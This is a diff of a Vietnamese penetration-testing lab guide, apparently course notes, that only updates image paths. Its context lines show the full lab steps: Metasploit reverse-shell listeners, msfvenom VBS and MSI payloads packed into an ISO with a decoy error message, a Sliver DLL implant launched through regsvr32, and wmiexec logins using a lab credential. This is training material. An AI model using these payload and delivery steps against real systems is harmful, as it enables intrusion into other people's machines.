@@ -2674,7 +2674,7 @@ Bạn có thể ping địa chỉ 10.130.10.25 từ máy ảo Slingshot Linux:
 ping -c 4 10.130.10.25
 ```
 
-![alt text](image.png)a
+![alt text](IMG/LAB2/LAB2.5/image.png)a
 
 ## Hướng dẫn thực hành từng bước
 
@@ -2692,11 +2692,11 @@ Trong Metasploit, chúng ta sẽ sử dụng `multi/handler` "exploit" để nh�
 use exploit/multi/handler
 ```
 
-![alt text](image-1.png)
+![alt text](IMG/LAB2/LAB2.5/image-1.png)
 
 Hãy lưu ý rằng Metasploit đã chọn payload mặc định là `generic/shell_reverse_tcp`. Đây không phải là payload lý tưởng, vì vậy chúng ta hãy thay đổi nó thành Meterpreter.
 
-![alt text](image-2.png)
+![alt text](IMG/LAB2/LAB2.5/image-2.png)
 
 Hãy cùng xem xét các tùy chọn mà chúng ta có sẵn với lỗ hổng và mã độc này.
 
@@ -2704,7 +2704,7 @@ Hãy cùng xem xét các tùy chọn mà chúng ta có sẵn với lỗ hổng v
 show options
 ```
 
-![alt text](image-3.png)
+![alt text](IMG/LAB2/LAB2.5/image-3.png)
 
 Lưu ý rằng mã khai thác giả của chúng ta không có tùy chọn nào. Đối với payload, chúng ta cần thiết lập cổng và máy chủ. Hãy thay đổi `LHOST` thành `eth0` và `LPORT` thành 3333.
 
@@ -2713,7 +2713,7 @@ set LHOST eth0
 set LPORT 3333
 ```
 
-![alt text](image-4.png)
+![alt text](IMG/LAB2/LAB2.5/image-4.png)
 
 Hãy kiểm tra lại xem các thiết lập đã chính xác chưa bằng cách chạy show optionslại chương trình.
 
@@ -2721,7 +2721,7 @@ Hãy kiểm tra lại xem các thiết lập đã chính xác chưa bằng cách
 show options
 ```
 
-![alt text](image-5.png)
+![alt text](IMG/LAB2/LAB2.5/image-5.png)
 
 Lưu ý rằng địa chỉ này `eth0` được tự động mở rộng thành địa chỉ IP liên kết với eth0giao diện.
 
@@ -2731,11 +2731,11 @@ Chúng ta có thể thiết lập trình lắng nghe để nhận nhiều kết 
 set ExitOnSession false
 ```
 
-![alt text](image-6.png)
+![alt text](IMG/LAB2/LAB2.5/image-6.png)
 
 Hãy khởi chạy trình lắng nghe bằng cách chạy nó như một tác vụ (`-j`) và không tương tác với các kết nối mới (`-z`).
 
-![alt text](image-7.png)
+![alt text](IMG/LAB2/LAB2.5/image-7.png)
 
 > Lưu ý: Địa chỉ IP của bạn sẽ khác.
 
@@ -2753,13 +2753,13 @@ Trước tiên, hãy cùng xem xét các loại dữ liệu có sẵn trong côn
 
 Trước tiên, hãy cùng xem xét các định dạng đầu ra của dữ liệu tải trọng.
 
-![alt text](image-9.png)
+![alt text](IMG/LAB2/LAB2.5/image-9.png)
 
 Chúng ta không thể tạo một kịch bản VBA để sử dụng trong macro, vì máy ảo Windows 10 không cài đặt sẵn Office. Chúng ta có thể sử dụng một kịch bản VB, rất tương tự, và chạy nó thủ công để mô phỏng macro.
 
 Thông thường, chúng ta sẽ tạo một macro VBA để đưa vào tài liệu Office và sử dụng nó cho mục đích tấn công phi kỹ thuật; tuy nhiên, máy ảo Windows 10 của chúng ta không cài đặt Office. Thay vì macro, chúng ta hãy tạo một tập lệnh VB mà chúng ta sẽ sử dụng để mô phỏng macro và khởi chạy phần mềm độc hại.
 
-![alt text](image-10.png)
+![alt text](IMG/LAB2/LAB2.5/image-10.png)
 
 Chúng ta có thể lưu trực tiếp kết quả vào một tệp bằng tùy chọn `--save` `-o` hoặc `--save` `--out`, nhưng với tùy chọn `tee--save`, chúng ta có thể xem nội dung của tệp khi nó được ghi. Lưu ý rằng tên biến và hàm của bạn khác với những gì được hiển thị ở trên. Metasploit ngẫu nhiên hóa tên để làm cho việc nhận dạng khó khăn hơn.
 
@@ -2776,7 +2776,7 @@ cd /tmp
 python3 -m http.server
 ```
 
-![alt text](image-11.png)
+![alt text](IMG/LAB2/LAB2.5/image-11.png)
 
 Chuyển sang hệ điều hành Windows và mở cửa sổ PowerShell. Sau đó chạy lệnh sau.
 
@@ -2790,11 +2790,11 @@ Hãy giải phóng bằng lệnh cscript.
 cscript payload.vbs
 ```
 
-![alt text](image-12.png)
+![alt text](IMG/LAB2/LAB2.5/image-12.png)
 
 Chuyển sang giao diện dòng lệnh Metasploit trên máy ảo Slingshot của bạn. Bạn sẽ thấy một phiên làm việc mới.
 
-![alt text](image-13.png)
+![alt text](IMG/LAB2/LAB2.5/image-13.png)
 
 Giờ đây bạn đã có một phiên Meterpreter đang chạy trên máy chủ Windows của mình bằng cách sử dụng tải trọng VBS. Trước tiên, chúng ta cần tương tác với phiên này. Trong ví dụ này, ID phiên là 1. ID phiên của bạn có thể khác. Hãy sử dụng số bạn thấy thay vì 1nếu ID phiên của bạn khác.
 
@@ -2802,7 +2802,7 @@ Giờ đây bạn đã có một phiên Meterpreter đang chạy trên máy ch�
 sessions -i 1
 ```
 
-![alt text](image-14.png)
+![alt text](IMG/LAB2/LAB2.5/image-14.png)
 
 Chạy `sysinfo` để nắm được thông tin cơ bản về phiên họp.
 
@@ -2810,7 +2810,7 @@ Chạy `sysinfo` để nắm được thông tin cơ bản về phiên họp.
 sysinfo
 ```
 
-![alt text](image-15.png)
+![alt text](IMG/LAB2/LAB2.5/image-15.png)
 
 Tiếp theo chúng ta sẽ sử dụng một payload khác, vậy nên hãy kết thúc `exit` phiên này.
 
@@ -2818,7 +2818,7 @@ Tiếp theo chúng ta sẽ sử dụng một payload khác, vậy nên hãy kế
 exit
 ```
 
-![alt text](image-16.png)
+![alt text](IMG/LAB2/LAB2.5/image-16.png)
 
 ### 4. Tạo gói tin MSI trong tệp ISO
 
@@ -2828,7 +2828,7 @@ Hãy chuyển sang cửa sổ dòng lệnh nơi bạn vừa chạy lệnh đó `
 msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=3333 -f msi -o /tmp/setup.msi
 ```
 
-![alt text](image-18.png)
+![alt text](IMG/LAB2/LAB2.5/image-18.png)
 
 Để tạo tệp ISO, chúng ta sẽ sử dụng công cụ `genisoimage` này. Chúng ta có thể chỉ định một thư mục hoặc một hoặc nhiều tệp. Chúng ta chỉ cần sử dụng tệp msi trong tệp ISO.
 
@@ -2836,7 +2836,7 @@ msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=3333 -f msi -o /tm
 genisoimage -o /tmp/installer.iso /tmp/setup.msi
 ```
 
-![alt text](image-19.png)
+![alt text](IMG/LAB2/LAB2.5/image-19.png)
 
 Hãy chuyển sang Windows, tải xuống và mở tập tin.
 
@@ -2850,15 +2850,15 @@ wget http://10.130.10.128:8000/installer.iso -OutFile installer.iso
 
 Trên màn hình máy tính của bạn giờ sẽ thấy `installer.iso`. Nhấp đúp vào tệp để gắn kết nó. Sau đó, nhấp đúp vào tệp `SETUP.MSI` để chạy nó.
 
-![alt text](image-20.png)
+![alt text](IMG/LAB2/LAB2.5/image-20.png)
 
 Bạn sẽ thấy trình cài đặt chạy, nhưng sau đó nó hiển thị thông báo lỗi.
 
-![alt text](image-21.png)
+![alt text](IMG/LAB2/LAB2.5/image-21.png)
 
 Thông báo lỗi này là bình thường. Nó được sử dụng để đánh lừa người dùng rằng không có gì xảy ra. Tuy nhiên, nếu bạn chuyển sang Metasploit, bạn sẽ thấy một phiên Meterpreter mới vừa được khởi tạo.
 
-![alt text](image-22.png)
+![alt text](IMG/LAB2/LAB2.5/image-22.png)
 
 Giờ đây bạn đã có một phiên Meterpreter đang chạy trên máy chủ Windows của mình bằng cách sử dụng tệp ISO và MSI. Trước tiên, chúng ta cần tương tác với phiên này. Trong ví dụ này, ID phiên là `2`. ID phiên của bạn có thể khác. Hãy sử dụng số bạn thấy thay vì `2` nếu trường hợp của bạn khác.
 
@@ -2866,7 +2866,7 @@ Giờ đây bạn đã có một phiên Meterpreter đang chạy trên máy ch�
 sessions -i 2
 ```
 
-![alt text](image-23.png)
+![alt text](IMG/LAB2/LAB2.5/image-23.png)
 
 Một lần nữa, hãy chạy `sysinfo` để nắm bắt thông tin cơ bản về phiên này.
 
@@ -2874,7 +2874,7 @@ Một lần nữa, hãy chạy `sysinfo` để nắm bắt thông tin cơ bản 
 sysinfo
 ```
 
-![alt text](image-24.png)
+![alt text](IMG/LAB2/LAB2.5/image-24.png)
 
 Tiếp theo chúng ta sẽ sử dụng Sliver. Vì vậy, hãy thoát khỏi Meterpreter và Metasploit.
 
@@ -2883,7 +2883,7 @@ exit
 exit
 ```
 
-![alt text](image-25.png)
+![alt text](IMG/LAB2/LAB2.5/image-25.png)
 
 ### 6. Sliver và Payload
 
@@ -2895,7 +2895,7 @@ Thiết lập trình lắng nghe trên cổng `443` bằng cách chạy lệnh `
 https
 ```
 
-![alt text](image-26.png)
+![alt text](IMG/LAB2/LAB2.5/image-26.png)
 
 Hãy cùng xem xét các tùy chọn với `generate`.
 
@@ -3017,7 +3017,7 @@ Sub Commands:
 
 Ta thấy dòng sau:
 
-![alt text](image-27.png)
+![alt text](IMG/LAB2/LAB2.5/image-27.png)
 
 Hãy xem `++ Formats ++` phần đó. Lưu ý rằng chúng ta không có nhiều tùy chọn đầu ra như với Metasploit. Khi sử dụng Sliver, bạn thường cần một công cụ hoặc phương pháp khác để tải shellcode.
 
@@ -3027,7 +3027,7 @@ Hãy tạo một tập tin exe mà chúng ta sẽ chạy trên một trong các 
 generate --os windows --arch 64bit --format shared --skip-symbols --http https://10.130.10.128
 ```
 
-![alt text](image-28.png)
+![alt text](IMG/LAB2/LAB2.5/image-28.png)
 
 > LƯU Ý: Tên dữ liệu tải trọng của bạn sẽ được tạo ngẫu nhiên và sẽ khác với tên OUTRAGEOUS_OTT.dll bạn thấy ở đây.
 
@@ -3041,7 +3041,7 @@ Tệp được tạo thuộc sở hữu của người dùng `root` và người
 ls -l *.dll
 ```
 
-![alt text](image-29.png)
+![alt text](IMG/LAB2/LAB2.5/image-29.png)
 
 Lưu ý rằng quyền `rwx` (Đọc, Ghi, Thực thi) chỉ áp dụng cho chủ sở hữu của tệp root. Hãy thay đổi quyền truy cập của tệp để chúng ta có thể tương tác với tệp như một người dùng thông thường.
 
@@ -3050,7 +3050,7 @@ sudo chown sec560:sec560 *.dll
 ls -l *.dll
 ```
 
-![alt text](image-30.png)
+![alt text](IMG/LAB2/LAB2.5/image-30.png)
 
 Giờ bạn sẽ thấy chủ sở hữu của tập tin là `sec560`.
 
@@ -3070,7 +3070,7 @@ exit
 
 > LƯU Ý: Thay thế PAYLOAD_NAME bằng tên tệp do Sliver tạo ra.
 
-![alt text](image-31.png)
+![alt text](IMG/LAB2/LAB2.5/image-31.png)
 
 ```bash
 sec560@slingshot:~$ smbclient.py hiboxy/bgreen:Password1@10.130.10.25
@@ -3117,11 +3117,11 @@ wmiexec.py hiboxy/bgreen:Password1@10.130.10.25
   regsvr32 OUTRAGEOUS_OTT.dll
 ```
 
-![alt text](image-32.png)
+![alt text](IMG/LAB2/LAB2.5/image-32.png)
 
 Bạn sẽ thấy phiên làm việc được gửi từ máy chủ đến Sliver.
 
-![alt text](image-33.png)
+![alt text](IMG/LAB2/LAB2.5/image-33.png)
 
 ID phiên ở đây là `3e468f91`, nhưng ID của bạn sẽ khác. Bạn chỉ cần sử dụng ký tự đầu tiên miễn là nó duy nhất trong tất cả các phiên của bạn. Chúng tôi sẽ sử dụng hai ký tự đầu tiên để giảm khả năng trùng lặp ký tự đầu tiên.
 
@@ -3129,11 +3129,11 @@ ID phiên ở đây là `3e468f91`, nhưng ID của bạn sẽ khác. Bạn ch�
 use 3e
 ```
 
-![alt text](image-34.png)
+![alt text](IMG/LAB2/LAB2.5/image-34.png)
 
 Hãy chạy info để lấy thông tin về `sesssion`. Thông tin của bạn sẽ khác với thông tin hiển thị ở đây.
 
-![alt text](image-35.png)
+![alt text](IMG/LAB2/LAB2.5/image-35.png)
 
 Để dọn dẹp, hãy thoát khỏi phiên làm việc và sử dụng Sliver.
 
